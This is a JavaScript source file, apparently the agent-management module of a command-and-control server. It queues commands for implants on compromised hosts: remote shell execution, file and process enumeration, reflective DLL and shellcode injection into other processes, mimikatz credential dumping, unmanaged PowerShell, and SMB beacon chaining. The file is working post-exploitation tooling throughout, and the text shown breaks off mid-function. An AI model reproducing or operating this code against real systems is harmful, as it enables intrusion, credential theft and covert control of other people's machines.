import fs from 'fs';
import * as ShellcodeRDI from '../modules/ShellcodeRDI';
import { ListenerCryptoAPI } from '../listeners/listeners_api.js';
//TODO Add ShellCode Injector Command
export default class Agents {
	constructor(connections, router) {
		this.activeAgents = {};
		this.connections = connections;
		this.router = router;
		this.commandsBase = {
			"clearQueue" : ["Clear the agent's current queue of commands."],
			"listQueue" : ["List the agen'ts current queue of commands."],
			"whoami" : ["List the current running user."],
			"cd" : ["Change the current working directory.", "cd [directory]"],
			"pwd" : ["List current working directory."],
			"ls" : ["List files in a directory.", "ls [directory]", "This command will list files in the current directory if none is provided."],
			"cat": ["Dump the contents of a file.", "cat [file]", "This command works best on text files and not binaries."],
			"ps" : ["List running processes."],
			"sleep" : ["Sleep for x seconds.", "sleep [time] [jitter*]", "The jitter is optional and is a percentage that randomizes the sleep."],
			"exit" : ["Exit out the agent with any custom code.", "exit [code]", "Running exit 0 exits normally, exit 1 exits the process of an injected thread."]		
		};
		this.linuxCommandsBase = Object.assign({}, this.commandsBase, {
			"exec" : ["Run a command.", "exec [command]"],
		});
		this.winCommandsBase = Object.assign({}, this.commandsBase, {
			//"testDLL": ["Command to Test DLLs during Development for LoadLibraryR and GetProcAddressR"],
			"inject": ["Inject a DLL into a running remote process.", "inject [pid|sac] [32|64] [function*]", "Running sac creates a sacrificial process to inject and function is an optional argument that runs a second function from the injected dll after dllmain."],
			"shInject": ["Inject shellcode into a remote process.", "shInject [pid|sac] [32|64]", "Running sac creates a sacrificial process to inject into."],
			"injectAgent": ["Inject an Agent DLL into a running remote process.", "injectAgent [pid|sac] [32|64] [http|smb]", "Running sac creates a sacrificial process to inject."],
			"message": ["Send a message box.", "message [message]", "This will create a message box with no title on the machine in a thread."],
			"ups": ["Run unmanaged powershell.", "ups [command]", "This will load an unmanaged powershell DLL locally and execute powershell."],
			"psInject": ["Inject an unmanaged powershell DLL into a process.", "psinject [pid|run|sac] [32|64*] [command]", "This command will inject an unmanaged powershell dll into any process and communicate with it using named pipes.  If it is already injected you will not be able to inject it again.  If it is already injected then an architecture does not need to be passed."],
			"mimikatz" : ["Run mimkatz commands.", "mimikatz [command]", "This will load a mimikatz dll locally and execute any commands against it."],
			"mimiInject": ["Inject mimikatz DLL into a process.", "mimikatz [pid|run|sac] [32|64*] [command]", "This will inject a mimikatz DLL into a process and communicate with it using named pipes.    If it is already injected you will not be able to inject it again.  If it is already injected then an architecture does not need to be passed."],
			"exec" : ["Run a command.", "exec [command]", "This is not opsec safe due to the fact it calls 'cmd.ex /c' and spawns a cmd.exe process.  It is advised not to use this if possible."],
			"set" : ["Set an option.", "set [option] [value]", "Change agent options on the fly."],
			"connect" : ["Connect to an SMB Beacon", "connect [ip]", "Connect to a remote SMB agent."],
			"disconnect" : ["Disconnect from an SMB Beacon", "disconnect [ip]", "Disconnect from an remote SMB agent."]
		});
		this.commandsWin32 = this.winCommandsBase;
		this.commandsWin64 = Object.assign({}, this.winCommandsBase, {
		});
		this.commandsLinux = this.linuxCommandsBase;
		this.commandsDarwin = this.linuxCommandsBase; 
	}

	addAgent(agentUUID,data) {
		this.activeAgents[agentUUID] = data;
		if (!fs.existsSync(`data/agents/${agentUUID}.json`)) {
			this.router.routes.chat.newChatData('New agent '+agentUUID+' connected from '+this.activeAgents[agentUUID]["ip"]+'!','AGENT +');
			this.connections.sendAll(JSON.stringify(this.router.routes.chat.getState()));
		}
		fs.writeFileSync(`data/agents/${agentUUID}.json`, JSON.stringify(data), function (err) {
			if (err) throw err;
		});
	}

	delAgent(agentUUID) {
		delete this.activeAgents[agentUUID];
		this.router.routes.chat.newChatData('Agent '+agentUUID+' has exited.','AGENT -');
		this.connections.sendAll(JSON.stringify(this.router.routes.chat.getState()));
		if (fs.existsSync(`data/queue/${agentUUID}.json`)) {
			fs.unlinkSync(`data/queue/${agentUUID}.json`);
		}
		if (fs.existsSync(`data/agents/${agentUUID}.json`)) {
			fs.unlinkSync(`data/agents/${agentUUID}.json`);
		}
		if (fs.existsSync(`data/routes/${agentUUID}.json`)) {
			fs.unlinkSync(`data/routes/${agentUUID}.json`);
		}
	}

	delAllAgents() {
		fs.readdirSync('data/agents/').forEach(file => {
			fs.unlinkSync('data/agents/'+file);
			if (fs.existsSync(`data/queue/${file}`)) {
				fs.unlinkSync(`data/queue/${file}`);
			}
			if (fs.existsSync(`data/routes/${file}`)) {
				fs.unlinkSync(`data/routes/${file}`);
			}
		});
		this.activeAgents = {};
	}

	toArrayBuffer(buf) {
		var ab = new ArrayBuffer(buf.length);
		var view = new Uint8Array(ab);
		for (var i = 0; i < buf.length; ++i) {
			view[i] = buf[i];
		}
		return ab;
	}

	injector(agentUUID, passedpid, passedarch, passeddll, passedfunc, fileOrBuffer) {
		const pid = passedpid;
		const arch = passedarch;
		const dll = passeddll;
		const func = passedfunc;
		const fob = fileOrBuffer;

		if (isNaN(pid) && pid !== 'sac') {
			console.log("[X] Non integer PID was passed for an inject!");
			this.activeAgents[agentUUID]['results'] = [ "[X] Non integer PID value was passed for inject!" ];
			this.connections.sendAll(JSON.stringify(this.activeAgents));
			return 0;
		}
		if (arch !== '64' && arch !=='32') {
			console.log("[X] Invalid arch passed!  64 or 32 are the only accepted values.");
			this.activeAgents[agentUUID]['results'] = [ "[X] Invalid arch passed!  64 or 32 are the only accepted values." ];
			this.connections.sendAll(JSON.stringify(this.activeAgents));
			return 0;
		}
		if (!(fs.existsSync(passeddll)) && !fob) {
			console.log("[X] DLL Does not exist!");
			this.activeAgents[agentUUID]['results'] = [ "[X] DLL Does not exist!" ];
			this.connections.sendAll(JSON.stringify(this.activeAgents));
			return 0;
		}

		let flags = 0;
		flags |= 0x1;
		flags | 0x4;

		let arrayBuff;
		if (fob === "dll" || fob === "shellcode") {
			console.log("[*] Running DLL from string!");
			arrayBuff = this.toArrayBuffer(Buffer.from(dll, 'base64'));
		}
		else {
			const buff = fs.readFileSync(dll);
			arrayBuff = buff.buffer.slice(buff.byteOffset, buff.byteOffset + buff.byteLength);
		}

		let res;
		if (fob === "shellcode") {
			res = arrayBuff;
		}
		else {
			res = ShellcodeRDI.ConvertToShellcode(arrayBuff,ShellcodeRDI.HashFunctionName(func),undefined,flags);
		}
		
		let injectData = {};
		let inject = {};
		if (pid === "sac"){
			injectData = {"pid":pid, "dll": Buffer.from(res).toString('base64'), "arch":arch};
			inject = {"7b6243c5bf0a48e6b78f60c3d37b3fb0": [ injectData ]};
		}
		else {
			injectData = {"pid":parseFloat(pid), "dll": Buffer.from(res).toString('base64'), "arch":arch};
			inject = {"7b6243c5bf0a48e6b78f60c3d37b3fb0": [ injectData ]};
		}
		if (fs.existsSync(`data/queue/${agentUUID}.json`)) {
			const data = JSON.parse(fs.readFileSync(`data/queue/${agentUUID}.json`));
			if ('7b6243c5bf0a48e6b78f60c3d37b3fb0' in data) {
				data['7b6243c5bf0a48e6b78f60c3d37b3fb0'].push(injectData);
				inject = data;
			}
			else {
				data['7b6243c5bf0a48e6b78f60c3d37b3fb0'] = inject['7b6243c5bf0a48e6b78f60c3d37b3fb0'];
				inject = data;
			}
		}
		return inject;
	}

	run(agentUUID,data) {
		const command = data.split(" ")[0];

		switch (command) {
			/*case "testDLL":
					const loadDLL2 = "Dll1.dll";
					let flags2 = 0;
					flags2 |= 0x1;
					flags2 | 0x4;
			
					let buff2 = fs.readFileSync(loadDLL2);
					let arrayBuff2 = buff2.buffer.slice(buff2.byteOffset, buff2.byteOffset + buff2.byteLength);
					const res2 = ShellcodeRDI.ConvertToShellcode(arrayBuff2,undefined,undefined,flags2);
	
					const testdata2 = {"test":Buffer.from(res2).toString('base64')};
					fs.writeFileSync(`data/queue/${agentUUID}.json`, JSON.stringify(testdata2))
					break;*/
			case "connect":
				if (data.split(" ").length < 2) {
					console.log("[X] Not enough arguments for 'connect' command.");
					this.activeAgents[agentUUID]['results'] = [ "[X] Not enough arguments for 'connect' command." ];
					this.connections.sendAll(JSON.stringify(this.activeAgents));
					break;
				}

				let remote = data.split(" ")[1];

				let smbAgentUUID;
				let smbComms = '{"42a805da0b27007d4f02d0ecab9b5ce3":"whoami"}';
				//Run commands for a specific UUID
				if (data.split(" ").length > 2) {
					smbAgentUUID = data.split(" ")[2];
					smbComms = fs.readFileSync(`data/queue/${smbAgentUUID}.json`, 'utf-8');
				}

				//console.log(smbComms);
				let listenerCryptoAPI = new ListenerCryptoAPI();
				let encCommand = listenerCryptoAPI.encryptDecrypt(smbComms);
				encCommand = Buffer.from(encCommand).toString('base64');
				var construct = `{"response":"${encCommand}"}`;

				let setConnectMessagePart = {"connect":{"1":remote},"fpipe": this.router.routes.smb_listener.options.PIPENAME, "connectData": construct};
				let setConnectMessage = {"connect":[]};

				if (fs.existsSync(`data/queue/${agentUUID}.json`)) {
					data = JSON.parse(fs.readFileSync(`data/queue/${agentUUID}.json`,'utf-8'));
					if (data['connect'] === undefined) {
						setConnectMessage['connect'].push(setConnectMessagePart);
						data['connect'] = setConnectMessage['connect'];
						fs.writeFileSync(`data/queue/${agentUUID}.json`, JSON.stringify(data));
					} else {
						let load = data['connect'];
						load.push(setConnectMessagePart);
						data['connect'] = load;
						fs.writeFileSync(`data/queue/${agentUUID}.json`, JSON.stringify(data));
					}
				} else {
					setConnectMessage["connect"].push(setConnectMessagePart);
					fs.writeFileSync(`data/queue/${agentUUID}.json`, JSON.stringify(setConnectMessage))
				}
				//fs.writeFileSync(`data/queue/${agentUUID}.json`, JSON.stringify(setConnectMessage));
				break;
			case "disconnect":
				if (data.split(" ").length < 2) {
					console.log("[X] Not enough arguments for 'connect' command.");
					this.activeAgents[agentUUID]['results'] = [ "[X] Not enough arguments for 'connect' command." ];
					this.connections.sendAll(JSON.stringify(this.activeAgents));
					break;
				}

				let ip = data.split(" ")[1];

				const routesData = JSON.parse(fs.readFileSync(`data/routes/${agentUUID}.json`,'utf-8'));
				delete routesData[ip];

				fs.writeFileSync(`data/routes/${agentUUID}.json`, JSON.stringify(routesData));
				this.activeAgents[agentUUID]['results'] = [ "[X] Agent has disconnected from "+ip ];
				this.connections.sendAll(JSON.stringify(this.activeAgents));

				const newRoutesRemoved = this.router.routes.smb_listener.getState();
				this.connections.sendAll(JSON.stringify(newRoutesRemoved));
				break;
			case "set":
					if (data.split(" ").length < 3) {
						console.log("[X] Not enough arguments for 'set' command.");
						this.activeAgents[agentUUID]['results'] = [ "[X] Not enough arguments for 'set' command." ];
						this.connections.sendAll(JSON.stringify(this.activeAgents));
						break;
					}

					let option = data.split(" ")[1];
					let value = data.split(" ").slice(2);
					value = value.join(" ");

					let setdataMessage = {"05d7cabfc666b7dca18eb59d155be124":[{"option":option,"value":value}]};
					if (fs.existsSync(`data/queue/${agentUUID}.json`)) {
						const setloadeddata = JSON.parse(fs.readFileSync(`data/queue/${agentUUID}.json`));
						if ('05d7cabfc666b7dca18eb59d155be124' in setloadeddata) {
							setloadeddata['05d7cabfc666b7dca18eb59d155be124'].push({"option":option,"value":value});
							setdataMessage = setloadeddata;
						}
						else {
							setloadeddata['05d7cabfc666b7dca18eb59d155be124'] = setdataMessage['05d7cabfc666b7dca18eb59d155be124'];
							setdataMessage = setloadeddata;
						}
					}
					fs.writeFileSync(`data/queue/${agentUUID}.json`, JSON.stringify(setdataMessage))
					break;
			case "clearQueue":
					if (fs.existsSync("data/queue/"+agentUUID+".json")) {
						this.activeAgents[agentUUID]['results'] = [ "Queue has been cleared." ];
						this.connections.sendAll(JSON.stringify(this.activeAgents));
						fs.unlinkSync("data/queue/"+agentUUID+".json");
					} else {
						this.activeAgents[agentUUID]['results'] = [ "No queue exists." ];
						this.connections.sendAll(JSON.stringify(this.activeAgents));
					}
					break;
			case "listQueue":
					const mapping = {
						"a5ced20888db593ae38dafe5182f3cc5" : "ls",
						"1eef4289d54dcfdcdb2c799ce232ca58" : "message",
						"369fe3167dd3846d129e071d05dff0ba" : "ups",
						"42a805da0b27007d4f02d0ecab9b5ce3" : "exec",
						"940a987b3fe113ede40266f583741df9" : "cd",
						"a268ee76cc22048f86a5a905b32814bb" : "pwd",
						"e8e0822326d9e3d3a7d2818769470cbc" : "cat",
						"05095c55757d514f7123a3e08175ca3a" : "ps",
						"8bc92ae80d75eff6caedde5b9010a1f8" : "sleep",
						"4cc6791e40eaacf7aa591b48a397ae7c" : "exit",
						"920017de3c6a8433b8cb22f9545f97be" : "mimikatz",
						"369fe3167dd3846d129e071d05dff0ba" : "ups",
						"7b6243c5bf0a48e6b78f60c3d37b3fb0" : "inject",
						"995f7ce14c94639e0ef66a5b9b55c3ac" : "mimiInject",
						"cc7152e8e85d74fe5a275d5e9335008f" : "psInject",
						"05d7cabfc666b7dca18eb59d155be124" : "set",
						"connect": "connect",
						"disconnect": "disconnect"
					};
					if (fs.existsSync("data/queue/"+agentUUID+".json")) {
						const commands = JSON.parse(fs.readFileSync(`data/queue/${agentUUID}.json`));
						let output = "";
						for (const key in commands) {
							commands[mapping[key]] = commands[key];
							delete commands[key];
						}
						for (const command in commands) {
							output += '"' + command + '"' + " : " + JSON.stringify(commands[command]) + "\n";
						}
						this.activeAgents[agentUUID]['results'] = [ output ];
						this.connections.sendAll(JSON.stringify(this.activeAgents));
					} else {
						this.activeAgents[agentUUID]['results'] = [ "No queue exists." ];
						this.connections.sendAll(JSON.stringify(this.activeAgents));
					}
					break;
			case "message":
					let message = data.split(" ").slice(1);
					message = message.join(" ");

					let dataMessage = {"1eef4289d54dcfdcdb2c799ce232ca58":{"message":message}};

					if (fs.existsSync(`data/queue/${agentUUID}.json`)) {
						const messageloadeddata = JSON.parse(fs.readFileSync(`data/queue/${agentUUID}.json`));
						messageloadeddata['1eef4289d54dcfdcdb2c799ce232ca58'] = [ dataMessage['1eef4289d54dcfdcdb2c799ce232ca58'] ];
						dataMessage = messageloadeddata;
					}
					fs.writeFileSync(`data/queue/${agentUUID}.json`, JSON.stringify(dataMessage))
					break;
			case "ups":
				let loadDLL = "static/dlls/ups.dll";
				let upscommand = data.split(" ").slice(1);
				upscommand = upscommand.join(" ");
				if (this.activeAgents[agentUUID]["platform"] === "win32") {
					loadDLL = "static/dlls/ups32.dll";
				}

				if (upscommand === undefined || upscommand === "") {
					console.log("[X] No command passed.");
					this.activeAgents[agentUUID]['results'] = [ "[X] No command passed." ];
					this.connections.sendAll(JSON.stringify(this.activeAgents));
					break;
				}

				let flags = 0;
				flags |= 0x1;
				flags | 0x4;
		
				let buff = fs.readFileSync(loadDLL);
				let arrayBuff = buff.buffer.slice(buff.byteOffset, buff.byteOffset + buff.byteLength);
				const res = ShellcodeRDI.ConvertToShellcode(arrayBuff,undefined,undefined,flags);

				let upsbuff = {};
				if (this.activeAgents[agentUUID]["upsLoaded"] === "true") {
					upsbuff = {"command":upscommand};
				}
				else{
					upsbuff = {"dll":Buffer.from(res).toString('base64'),"command":upscommand};
				}
				let upsdata = {"369fe3167dd3846d129e071d05dff0ba": [ upsbuff ]};
				if (fs.existsSync(`data/queue/${agentUUID}.json`)) {
					const upsloadeddata = JSON.parse(fs.readFileSync(`data/queue/${agentUUID}.json`));
					if ('369fe3167dd3846d129e071d05dff0ba' in upsloadeddata) {
						upsloadeddata['369fe3167dd3846d129e071d05dff0ba'].push(upsbuff);
						upsdata = upsloadeddata;
					}
					else {
						upsloadeddata['369fe3167dd3846d129e071d05dff0ba'] = upsdata['369fe3167dd3846d129e071d05dff0ba'];
						upsdata = upsloadeddata;
					}
				}
				fs.writeFileSync(`data/queue/${agentUUID}.json`, JSON.stringify(upsdata))
				break;
			case "mimikatz":
				let mloadDLL = "static/dlls/powerkatz.dll";
				let mcommand = data.split(" ").slice(1);
				mcommand = mcommand.join(" ");
				if (this.activeAgents[agentUUID]["platform"] === "win32") {
					mloadDLL = "static/dlls/powerkatz32.dll";
				}

				if (mcommand === undefined || mcommand === "") {
					console.log("[X] No command passed.");
					this.activeAgents[agentUUID]['results'] = [ "[X] No command passed." ];
					this.connections.sendAll(JSON.stringify(this.activeAgents));
					break;
				}

				let mflags = 0;
				mflags |= 0x1;
				mflags | 0x4;
		
				let m2buff = fs.readFileSync(mloadDLL);
				let marrayBuff = m2buff.buffer.slice(m2buff.byteOffset, m2buff.byteOffset + m2buff.byteLength);
				const mres = ShellcodeRDI.ConvertToShellcode(marrayBuff,undefined,undefined,mflags);

				let mbuff = {};
				if (this.activeAgents[agentUUID]["mLoaded"] === "true") {
					mbuff = {"command":mcommand};
				}
				else {
					mbuff = {"dll":Buffer.from(mres).toString('base64'),"command":mcommand};
				}
				let mdata = {"920017de3c6a8433b8cb22f9545f97be": [ mbuff ]};
				if (fs.existsSync(`data/queue/${agentUUID}.json`)) {
					const mloadeddata = JSON.parse(fs.readFileSync(`data/queue/${agentUUID}.json`));
					if ('920017de3c6a8433b8cb22f9545f97be' in mloadeddata) {
						mloadeddata['920017de3c6a8433b8cb22f9545f97be'].push(mbuff);
						mdata = mloadeddata;
					}
					else {
						mloadeddata['920017de3c6a8433b8cb22f9545f97be'] = mdata['920017de3c6a8433b8cb22f9545f97be'];
						mdata = mloadeddata;
					}
				}
				fs.writeFileSync(`data/queue/${agentUUID}.json`, JSON.stringify(mdata))
				break;
			case "inject":
				const injectpid = data.split(" ")[1];
				const injectarch = data.split(" ")[2];
				const injectfunc = data.split(" ")[3];
				const injectdll = data.split(" ")[4];

				const injectdata = this.injector(agentUUID, injectpid, injectarch, injectdll, injectfunc, "dll");
				if (injectdata !== 0) {
					fs.writeFileSync(`data/queue/${agentUUID}.json`, JSON.stringify(injectdata));
				}
				break;
			case "shInject":
				const injectpidsh = data.split(" ")[1];
				const injectarchsh = data.split(" ")[2];
				const injectdllsh = data.split(" ")[3];

				const injectdatash = this.injector(agentUUID, injectpidsh, injectarchsh, injectdllsh, undefined, "shellcode");
				if (injectdatash !== 0) {
					fs.writeFileSync(`data/queue/${agentUUID}.json`, JSON.stringify(injectdatash));
				}
				break;
			case "injectAgent":
				const agentpid = data.split(" ")[1];
				const agentarch = data.split(" ")[2];
				const agenttype = data.split(" ")[3];
				let agentdll = 'data/agents_staged/AgentDLL.dll';
				if (agentarch === '32') {
					agentdll = 'data/agents_staged/AgentDLL32.dll';
				}
				if (agenttype === "smb") {
					agentdll = agentdll.replace("AgentDLL","AgentSMB");
				} else if (agenttype !== "http") {
					this.activeAgents[agentUUID]['results'] = [ "[X] Must provide a valid type of either 'http' or 'smb'." ];
					this.connections.sendAll(JSON.stringify(this.activeAgents));
					break;
				}
				const agentfunc = "main";

				const agentdata = this.injector(agentUUID, agentpid, agentarch, agentdll, agentfunc);
				if (agentdata !== 0) {
					fs.writeFileSync(`data/queue/${agentUUID}.json`, JSON.stringify(agentdata));
				}
				break;
			case "mimiInject":
				const mimikatzpid = data.split(" ")[1];
				const mimikatzarch = data.split(" ")[2];
				let mimikatzcommand = data.split(" ").slice(3);
				mimikatzcommand = mimikatzcommand.join(" ");
				const mimikatzfunc = 'main';
				let mimikatzdata = {};
				
				if (mimikatzpid === 'run') {
					if (this.activeAgents[agentUUID]['mrunning'] === 'false') {
						console.log("[X] Mimikatz DLL is not injected!  Inject into a process first.");
						this.activeAgents[agentUUID]['results'] = [ "[X] Mimikatz DLL is not injected!  Inject into a process first." ];
						this.connections.sendAll(JSON.stringify(this.activeAgents));
						break;
					}
				}
				else {
					if (this.activeAgents[agentUUID]['mrunning'] === 'true') {
						console.log("[X] Mimikatz DLL is already injected.  Run 'mimiInject run exit' to remove current instance first.");
						this.activeAgents[agentUUID]['results'] = [ "[X] Mimikatz DLL is already injected.  Run 'mimiInject run exit' to remove current instance first." ];
						this.connections.sendAll(JSON.stringify(this.activeAgents));
						break;
					}
				}

				if (mimikatzarch === undefined || mimikatzcommand === undefined || mimikatzcommand === "" || mimikatzcommand === " ") {
					if (mimikatzpid !== 'run') {
						console.log("[X] Arch or Command is undefined!");
						this.activeAgents[agentUUID]['results'] = [ "[X] Arch or Command is undefined!" ];
						this.connections.sendAll(JSON.stringify(this.activeAgents));
						break;
					}
				}
				let mimikatzdll = 'static/dlls/mimikatz.dll';
				if (mimikatzarch === '32') {
					mimikatzdll = 'static/dlls/mimikatz32.dll';
				}

				if (mimikatzpid === 'run') {
					mimikatzdata['995f7ce14c94639e0ef66a5b9b55c3ac'] = {'cmd':mimikatzarch,'length':parseFloat(mimikatzarch.length)};
					if (fs.existsSync(`data/queue/${agentUUID}.json`)) {
						const mimikatzloadeddata = JSON.parse(fs.readFileSync(`data/queue/${agentUUID}.json`));
						if ('995f7ce14c94639e0ef66a5b9b55c3ac' in mimikatzloadeddata) {
								mimikatzloadeddata['995f7ce14c94639e0ef66a5b9b55c3ac'].push(mimikatzdata['995f7ce14c94639e0ef66a5b9b55c3ac']);
								mimikatzdata = mimikatzloadeddata;
						}
						else {
							mimikatzloadeddata['995f7ce14c94639e0ef66a5b9b55c3ac'] = [ mimikatzdata['995f7ce14c94639e0ef66a5b9b55c3ac'] ];
							mimikatzdata = mimikatzloadeddata;
						}
					}
					else{
						mimikatzdata['995f7ce14c94639e0ef66a5b9b55c3ac'] = [ mimikatzdata['995f7ce14c94639e0ef66a5b9b55c3ac'] ];
					}
					fs.writeFileSync(`data/queue/${agentUUID}.json`, JSON.stringify(mimikatzdata));
				}
				else {
					mimikatzdata = this.injector(agentUUID, mimikatzpid, mimikatzarch, mimikatzdll, mimikatzfunc);
					if (mimikatzdata !== 0) {
						mimikatzdata['995f7ce14c94639e0ef66a5b9b55c3ac'] = [ {'cmd':mimikatzcommand,'length':parseFloat(mimikatzcommand.length)} ];
						if (fs.existsSync(`data/queue/${agentUUID}.json`)) {
							const mimikatzloadeddata = JSON.parse(fs.readFileSync(`data/queue/${agentUUID}.json`));
							mimikatzdata = Object.assign({}, mimikatzloadeddata, mimikatzdata);
						}
						fs.writeFileSync(`data/queue/${agentUUID}.json`, JSON.stringify(mimikatzdata));
					}				
				}
				break;
			case "psInject":
				let psinjectpid = data.split(" ")[1];
				let psinjectarch = undefined;
				let psinjectcommand = undefined;

				if (psinjectpid === 'run') {
					if (this.activeAgents[agentUUID]['psrunning'] === 'false') {
						console.log("[X] PSInject DLL is not injected!  Inject into a process first.");
						this.activeAgents[agentUUID]['results'] = [ "[X] PSInject DLL is not injected!  Inject into a process first." ];
						this.connections.sendAll(JSON.stringify(this.activeAgents));
						break;
					}
				}
				else {
					if (this.activeAgents[agentUUID]['psrunning'] === 'true') {
						console.log("[X] PSInject DLL is already injected.  Run 'psInject run exit' to remove current instance first.");
						this.activeAgents[agentUUID]['results'] = [ "[X] PSInject DLL is already injected.  Run 'psInject run exit' to remove current instance first." ];
						this.connections.sendAll(JSON.stringify(this.activeAgents));
						break;
					}
				}

				let psinjectdata = {};
				if (psinjectpid === 'run') {
					psinjectcommand = data.split(" ").slice(2);
					psinjectcommand = psinjectcommand.join(" ");
					if (psinjectcommand === "") {
						console.log("[X] Arch or Command is undefined!");
						this.activeAgents[agentUUID]['results'] = [ "[X] Arch or Command is undefined!" ];
						this.connections.sendAll(JSON.stringify(this.activeAgents));
						break;
					}
					psinjectdata['cc7152e8e85d74fe5a275d5e9335008f'] = {'cmd':psinjectcommand,'length':parseFloat(psinjectcommand.length)};
					if (fs.existsSync(`data/queue/${agentUUID}.json`)) {
						const psinjectloadeddata = JSON.parse(fs.readFileSync(`data/queue/${agentUUID}.json`));
						if ('cc7152e8e85d74fe5a275d5e9335008f' in psinjectloadeddata) {
								psinjectloadeddata['cc7152e8e85d74fe5a275d5e9335008f'].push(psinjectdata['cc7152e8e85d74fe5a275d5e9335008f']);
								psinjectdata = psinjectloadeddata;
						}
						else {
							psinjectloadeddata['cc7152e8e85d74fe5a275d5e9335008f'] = [ psinjectdata['cc7152e8e85d74fe5a275d5e9335008f'] ];
							psinjectdata = psinjectloadeddata;
						}						
					}
					else{
						psinjectdata['cc7152e8e85d74fe5a275d5e9335008f'] = [ psinjectdata['cc7152e8e85d74fe5a275d5e9335008f'] ];
					}
					fs.writeFileSync(`data/queue/${agentUUID}.json`, JSON.stringify(psinjectdata));
				}
				else {
					psinjectarch = data.split(" ")[2];
					psinjectcommand = data.split(" ")[3];
					if (psinjectarch === undefined || psinjectcommand === undefined || psinjectcommand === "" || psinjectcommand === " ") {
						console.log("[X] Arch or Command is undefined!");
						this.activeAgents[agentUUID]['results'] = [ "[X] Arch or Command is undefined!" ];
						this.connections.sendAll(JSON.stringify(this.activeAgents));
						break;
					}
					let psinjectdll = 'static/dlls/UnmanagedPowerShell.dll';
					if (psinjectarch === '32') {
						psinjectdll = 'static/dlls/UnmanagedPowerShell32.dll';
					}
					const psinjectfunc = 'main';

					psinjectdata = this.injector(agentUUID, psinjectpid, psinjectarch, psinjectdll, psinjectfunc);
					if (psinjectdata !== 0) {
						psinjectdata['cc7152e8e85d74fe5a275d5e9335008f'] = [ {'cmd':psinjectcommand,'length':parseFloat(psinjectcommand.length)} ];
						if (fs.existsSync(`data/queue/${agentUUID}.json`)) {
							const psinjectloadeddata = JSON.parse(fs.readFileSync(`data/queue/${agentUUID}.json`));
							psinjectdata = Object.assign({}, psinjectloadeddata, psinjectdata);
						}
						fs.writeFileSync(`data/queue/${agentUUID}.json`, JSON.stringify(psinjectdata));
					}
				}
				break;
			case "whoami":
				let comm = {"42a805da0b27007d4f02d0ecab9b5ce3": `${data.split(" ")[0]}`}
				if (fs.existsSync(`data/queue/${agentUUID}.json`)) {
					const data = JSON.parse(fs.readFileSync(`data/queue/${agentUUID}.json`));
					data['42a805da0b27007d4f02d0ecab9b5ce3'] = comm['42a805da0b27007d4f02d0ecab9b5ce3'];
					comm = data;
				}
				fs.writeFileSync(`data/queue/${agentUUID}.json`, JSON.stringify(comm));
				break;
			case "ps":
					let pscomm = {"05095c55757d514f7123a3e08175ca3a": ""}
					if (fs.existsSync(`data/queue/${agentUUID}.json`)) {
						const psdata = JSON.parse(fs.readFileSync(`data/queue/${agentUUID}.json`));
						psdata['05095c55757d514f7123a3e08175ca3a'] = pscomm['05095c55757d514f7123a3e08175ca3a'];
						pscomm = psdata;
					}
					fs.writeFileSync(`data/queue/${agentUUID}.json`, JSON.stringify(pscomm));
					break;
			case "pwd":
				let pwdcomm = {"a268ee76cc22048f86a5a905b32814bb": ""}
				if (fs.existsSync(`data/queue/${agentUUID}.json`)) {
					const pwddata = JSON.parse(fs.readFileSync(`data/queue/${agentUUID}.json`));
					pwddata['a268ee76cc22048f86a5a905b32814bb'] = pwdcomm['a268ee76cc22048f86a5a905b32814bb'];
					pwdcomm = pwddata;
				}
				fs.writeFileSync(`data/queue/${agentUUID}.json`, JSON.stringify(pwdcomm));
				break;
			case "ls":
				let path = '.';
				if (data.split(" ").length >1 ){
					path = data.split(" ")[1];
				}
				let lscomm = {"a5ced20888db593ae38dafe5182f3cc5": [ path ]};
				if (fs.existsSync(`data/queue/${agentUUID}.json`)) {
					const lsdata = JSON.parse(fs.readFileSync(`data/queue/${agentUUID}.json`));
					if ('a5ced20888db593ae38dafe5182f3cc5' in lsdata) {
						lsdata['a5ced20888db593ae38dafe5182f3cc5'].push(path)
						lscomm = lsdata;
					}
					else{
						lsdata['a5ced20888db593ae38dafe5182f3cc5'] = lscomm['a5ced20888db593ae38dafe5182f3cc5'];
						lscomm = lsdata;
					}
				}
				fs.writeFileSync(`data/queue/${agentUUID}.json`, JSON.stringify(lscomm));
				break;	
			case "exec":
				let command = data.substr(data.indexOf(' ')+1);
				if (this.activeAgents[agentUUID]['platform'] === 'win32' || this.activeAgents[agentUUID]['platform'] === 'win64') {
					command = 'cmd.exe /c '+command;
				}
				let comm2 = {"42a805da0b27007d4f02d0ecab9b5ce3": [ command ] };
				if (fs.existsSync(`data/queue/${agentUUID}.json`)) {
					const data = JSON.parse(fs.readFileSync(`data/queue/${agentUUID}.json`));
					if ('42a805da0b27007d4f02d0ecab9b5ce3' in data) {
						data['42a805da0b27007d4f02d0ecab9b5ce3'].push(command);
						comm2 = data;
					}
					else {
						data['42a805da0b27007d4f02d0ecab9b5ce3'] = [ comm2['42a805da0b27007d4f02d0ecab9b5ce3'] ];
						comm2 = data;
					}
				}
				fs.writeFileSync(`data/queue/${agentUUID}.json`, JSON.stringify(comm2))
				break;
			case "cd":
				let cdCommand = data.split(" ").slice(1);
				cdCommand = cdCommand.join(" ");
				let comm5 = {"940a987b3fe113ede40266f583741df9": cdCommand}
				if (fs.existsSync(`data/queue/${agentUUID}.json`)) {
					const data = JSON.parse(fs.readFileSync(`data/queue/${agentUUID}.json`));
					data['940a987b3fe113ede40266f583741df9'] = comm5['940a987b3fe113ede40266f583741df9'];
					comm5 = data;
				}
				fs.writeFileSync(`data/queue/${agentUUID}.json`, JSON.stringify(comm5));
				break;
			case "cat":
				let catCommand = data.split(" ").slice(1);
				catCommand = catCommand.join(" ");

				let catMessage = {"e8e0822326d9e3d3a7d2818769470cbc": [ catCommand ]};
				if (fs.existsSync(`data/queue/${agentUUID}.json`)) {
					const catloadeddata = JSON.parse(fs.readFileSync(`data/queue/${agentUUID}.json`));
					if ('e8e0822326d9e3d3a7d2818769470cbc' in catloadeddata) {
						catloadeddata['e8e0822326d9e3d3a7d2818769470cbc'].push(catCommand);
						catMessage = catloadeddata;
					}
					else {
						catloadeddata['e8e0822326d9e3d3a7d2818769470cbc'] = [ catCommand ];
						catMessage = catloadeddata;
					}
				}
				fs.writeFileSync(`data/queue/${agentUUID}.json`, JSON.stringify(catMessage));
				break;
			case "sleep":
				let sleepTime = data.substr(data.indexOf(' ')+1);
				let comm3 = {"8bc92ae80d75eff6caedde5b9010a1f8": `${sleepTime}`}
				if (fs.existsSync(`data/queue/${agentUUID}.json`)) {
					const data = JSON.parse(fs.readFileSync(`data/queue/${agentUUID}.json`));
